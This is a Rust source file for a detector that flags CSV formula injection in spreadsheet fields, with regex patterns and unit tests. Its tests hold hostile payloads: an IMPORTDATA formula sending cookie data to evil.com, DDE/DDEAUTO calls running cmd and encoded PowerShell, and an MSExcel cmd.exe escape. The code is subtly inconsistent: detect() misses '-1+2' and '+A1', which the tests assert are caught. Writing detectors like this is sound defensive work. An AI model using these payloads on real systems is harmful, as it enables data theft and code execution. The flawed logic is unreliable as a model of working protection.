use crate::detectors::detector_trait::InputDetector;
use regex::Regex;
use lazy_static::lazy_static;

lazy_static! {
    // Pattern for basic formula markers at start of field
    static ref FORMULA_MARKER: Regex = Regex::new(r"^\s*[=\+\-@]").unwrap();
    
    // Excel/LibreOffice function patterns
    static ref EXCEL_FUNCTIONS: Regex = Regex::new(r"(?i)^=\s*(SUM|AVERAGE|IF|AND|OR|NOT|CONCATENATE|LEN|MID|NOW|RAND|RANDBETWEEN|RIGHT|LEFT|ROUND|HYPERLINK|CELL|OFFSET|INDEX|MATCH|VLOOKUP|HLOOKUP|INDIRECT|SHEET|SHEETS|CHAR|CODE|DDE|DDEAUTO)").unwrap();
    
    // Google Sheets function patterns
    static ref GOOGLE_FUNCTIONS: Regex = Regex::new(r"(?i)^=\s*(IMPORTXML|IMPORTHTML|IMPORTDATA|IMPORTRANGE|QUERY|ARRAYFORMULA|IMAGE|URL)").unwrap();
    
    // Dangerous functions that could lead to remote content loading or code execution
    static ref DANGEROUS_FUNCTIONS: Regex = Regex::new(r"(?i)^=\s*(HYPERLINK|WEBSERVICE|DDE|DDEAUTO|CALL|EXEC|IMPORTXML|IMPORTHTML|IMPORTDATA|IMPORTRANGE)").unwrap();
    
    // Macro related code
    static ref MACRO_CONTENT: Regex = Regex::new(r"(?i)^=.*!|\$.*!\$|^@|SHELL|MSExcel").unwrap();
    
    // Data URI schemes
    static ref DATA_URI: Regex = Regex::new(r"(?i)data:").unwrap();
}

/// Detector for CSV Injection attacks targeting spreadsheet applications
/// 
/// Detects formula injections that could execute when a CSV file is opened
/// in spreadsheet applications like Excel, LibreOffice Calc, or Google Sheets.
pub struct CsvInjectionDetector;

impl CsvInjectionDetector {
    /// Create a new instance of the CSV injection detector
    pub fn new() -> Self {
        CsvInjectionDetector
    }
    
    /// Check if the input starts with formula markers (=, +, -, @)
    fn contains_formula_markers(&self, input: &str) -> bool {
        FORMULA_MARKER.is_match(input)
    }
    
    /// Check if the input contains Excel or LibreOffice function patterns
    fn contains_spreadsheet_functions(&self, input: &str) -> bool {
        EXCEL_FUNCTIONS.is_match(input) || GOOGLE_FUNCTIONS.is_match(input)
    }
    
    /// Check if the input contains dangerous functions that could lead to code execution
    fn contains_dangerous_functions(&self, input: &str) -> bool {
        DANGEROUS_FUNCTIONS.is_match(input)
    }
    
    /// Check for DDE command execution specifically
    fn contains_dde_commands(&self, input: &str) -> bool {
        let lower_input = input.to_lowercase();
        
        (lower_input.contains("=dde") || lower_input.contains("=ddeauto")) && 
        (lower_input.contains("cmd") || 
         lower_input.contains("powershell") || 
         lower_input.contains("mshta") || 
         lower_input.contains("wscript") || 
         lower_input.contains("cscript"))
    }
    
    /// Check for HYPERLINK formula which is commonly used in CSV injection
    fn contains_hyperlink_formula(&self, input: &str) -> bool {
        let lower_input = input.to_lowercase();
        
        lower_input.contains("=hyperlink(") || 
        lower_input.contains("=hyperlink ")
    }
    
    /// Check for more complex nested formulas
    fn contains_nested_formulas(&self, input: &str) -> bool {
        let clean_input = input.trim();
        
        // Check for multiple opening and closing parentheses indicating nested functions
        if clean_input.starts_with("=") {
            let open_count = clean_input.matches('(').count();
            let close_count = clean_input.matches(')').count();
            
            // Multiple sets of parentheses often indicate nested formulas
            if open_count > 1 && open_count == close_count {
                return true;
            }
            
            // Check for concatenation operators which are often used to obfuscate
            if clean_input.contains("&") || clean_input.contains("CONCATENATE") {
                return true;
            }
        }
        
        false
    }
    
    /// Check for attempts to mask formula injection by using quotes and concatenation
    fn contains_obfuscation_techniques(&self, input: &str) -> bool {
        let clean_input = input.trim();
        
        // Concatenation used to construct formulas
        if clean_input.contains("=\"") && clean_input.contains("&\"") {
            return true;
        }
        
        // CHAR() function used to obfuscate characters
        if clean_input.contains("CHAR(") {
            return true;
        }
        
        // Data URIs can be used to obfuscate
        if DATA_URI.is_match(clean_input) {
            return true;
        }
        
        false
    }
    
    /// Check if the input is likely benign
    fn is_likely_benign(&self, input: &str) -> bool {
        let clean_input = input.trim();
        
        // Empty or very short inputs are likely benign
        if clean_input.is_empty() || clean_input.len() < 2 {
            return true;
        }
        
        // If it doesn't start with a formula marker, it's likely safe
        if !self.contains_formula_markers(clean_input) {
            return true;
        }
        
        // A single equals sign followed by a number without any operations is likely benign
        // Note: We now make sure there are no operation characters (+, -, *, /) in the input
        if clean_input.starts_with("=") && 
           clean_input.len() > 1 && 
           !clean_input.contains('+') && 
           !clean_input.contains('-') && 
           !clean_input.contains('*') && 
           !clean_input.contains('/') && 
           clean_input[1..].chars().all(|c| c.is_numeric() || c.is_whitespace()) {
            return true;
        }
        
        false
    }
}

impl InputDetector for CsvInjectionDetector {
    fn detect(&self, input: &str) -> bool {
        let clean_input = input.trim();
        
        // Skip detection for obviously benign inputs
        if clean_input.is_empty() || clean_input.len() < 2 {
            return false;
        }
        
        // Short-circuit for arithmetic operations
        if clean_input.starts_with("=") && 
           (clean_input.contains('+') || 
            clean_input.contains('-') || 
            clean_input.contains('*') || 
            clean_input.contains('/')) {
            // If it contains arithmetic operations, it's likely a formula
            return true;
        }
        
        // Skip detection for other obviously benign inputs
        if self.is_likely_benign(clean_input) {
            return false;
        }
        
        // Check for formula markers
        if self.contains_formula_markers(clean_input) {
            // Look for specific spreadsheet functions
            if self.contains_spreadsheet_functions(clean_input) {
                return true;
            }
            
            // Check for dangerous functions specifically
            if self.contains_dangerous_functions(clean_input) {
                return true;
            }
            
            // Check for DDE commands
            if self.contains_dde_commands(clean_input) {
                return true;
            }
            
            // Check for HYPERLINK formulas
            if self.contains_hyperlink_formula(clean_input) {
                return true;
            }
            
            // Check for nested formulas
            if self.contains_nested_formulas(clean_input) {
                return true;
            }
            
            // Check for obfuscation techniques
            if self.contains_obfuscation_techniques(clean_input) {
                return true;
            }
        }
        
        // Check for macro content
        if MACRO_CONTENT.is_match(clean_input) {
            return true;
        }
        
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_safe_inputs() {
        let detector = CsvInjectionDetector::new();
        
        assert!(!detector.detect("John Smith"), "Simple name should be safe");
        assert!(!detector.detect("42"), "Number should be safe");
        assert!(!detector.detect("2023-01-01"), "Date should be safe");
        assert!(!detector.detect("This is a normal comment."), "Normal text should be safe");
        assert!(!detector.detect("Column 1, Column 2, Column 3"), "Column headers should be safe");
        assert!(!detector.detect("+1 (123) 456-7890"), "Phone number with plus should be safe");
    }
    
    #[test]
    fn test_basic_formula_injection() {
        let detector = CsvInjectionDetector::new();
        
        assert!(detector.detect("=1+1"), "Basic formula should be detected");
        assert!(detector.detect("=SUM(A1:A10)"), "SUM formula should be detected");
        assert!(detector.detect("=A1+B1"), "Cell reference formula should be detected");
        assert!(detector.detect("@SUM(A1:A10)"), "Legacy Lotus formula should be detected");
        assert!(detector.detect("-1+2"), "Formula starting with minus should be detected");
        assert!(detector.detect("+A1"), "Formula starting with plus should be detected");
    }
    
    #[test]
    fn test_dangerous_functions() {
        let detector = CsvInjectionDetector::new();
        
        assert!(detector.detect("=HYPERLINK(\"https://evil.com\",\"Click here\")"), "HYPERLINK formula should be detected");
        assert!(detector.detect("=WEBSERVICE(\"https://evil.com/exploit\")"), "WEBSERVICE formula should be detected");
        assert!(detector.detect("=DDE(\"cmd\",\"/c calc\",\"1\")"), "DDE command execution should be detected");
        assert!(detector.detect("=DDEAUTO(\"cmd\",\"/c powershell -e base64payload\",\"1\")"), "DDEAUTO command execution should be detected");
    }
    
    #[test]
    fn test_google_sheets_injection() {
        let detector = CsvInjectionDetector::new();
        
        assert!(detector.detect("=IMPORTXML(\"https://evil.com\",\"//secrets\")"), "IMPORTXML should be detected");
        assert!(detector.detect("=IMPORTDATA(\"https://evil.com/steal?cookie=\"&A1)"), "IMPORTDATA should be detected");
        assert!(detector.detect("=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/abcd\",\"Sheet1!A1:C10\")"), "IMPORTRANGE should be detected");
        assert!(detector.detect("=IMAGE(\"https://evil.com/tracker.jpg\")"), "IMAGE function should be detected");
    }
    
    #[test]
    fn test_obfuscation_techniques() {
        let detector = CsvInjectionDetector::new();
        
        assert!(detector.detect("=\"=\"&\"HYPERLINK(\"\"https://evil.com\"\",\"\"Click here\"\")\""), "Concatenated formula should be detected");
        assert!(detector.detect("=CONCATENATE(\"HYPER\",\"LINK(\"\"https://evil.com\"\",\"\"Click here\"\")\""), "CONCATENATE obfuscation should be detected");
        assert!(detector.detect("=CHAR(61)&CHAR(72)&CHAR(89)&CHAR(80)&CHAR(69)&CHAR(82)&CHAR(76)&CHAR(73)&CHAR(78)&CHAR(75)"), "CHAR obfuscation should be detected");
        assert!(detector.detect("=IF(1=1,HYPERLINK(\"https://evil.com\",\"Click here\"),\"\")"), "Nested formula should be detected");
    }
    
    #[test]
    fn test_macro_and_dde() {
        let detector = CsvInjectionDetector::new();
        
        assert!(detector.detect("=Sheet1!A1"), "Sheet reference with ! should be detected");
        assert!(detector.detect("=DDE(\"cmd\",\"/c calc\",\"1\")"), "DDE command should be detected");
        assert!(detector.detect("=DDEAUTO(\"cmd\",\"/c calc\",\"1\")"), "DDEAUTO command should be detected");
        assert!(detector.detect("@MSExcel\\..\\..\\..\\windows\\system32\\cmd.exe /c calc"), "MSExcel Shell escape should be detected");
    }
    
    #[test]
    fn test_edge_cases() {
        let detector = CsvInjectionDetector::new();
        
        // Not malicious
        assert!(!detector.detect("=42"), "Simple equals number should be safe");
        assert!(!detector.detect("Equal to 42"), "Text containing equals should be safe");
        assert!(!detector.detect(" ="), "Just equals with whitespace should be safe");
        
        // Malicious
        assert!(detector.detect("= SUM(A1:A10)"), "Formula with space after equals should be detected");
        assert!(detector.detect("\t=HYPERLINK(\"https://evil.com\",\"Click here\")"), "Formula with tab before equals should be detected");
    }
} 